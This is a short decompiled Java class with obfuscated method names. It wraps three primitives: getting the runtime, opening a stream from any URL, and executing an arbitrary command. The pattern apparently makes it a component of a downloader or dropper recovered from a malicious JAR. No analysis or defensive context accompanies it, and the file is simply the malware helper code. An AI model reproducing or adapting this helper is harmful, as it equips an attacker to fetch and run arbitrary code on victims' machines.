import java.net.URL;
import java.io.InputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public class Sento
{
    public static Runtime osgPL() {
        return Runtime.getRuntime();
    }
    
    public static InputStream Iopls(final String sdhds) throws Exception {
        final URL url = new URL(sdhds);
        try {
            url.openConnection();
        }
        catch (Exception ex) {}
        return url.openStream();
    }
    
    public static void owms(final String fn) throws Exception {
        final Process dexa = osgPL().exec(fn);
        dexa.waitFor();
    }
}
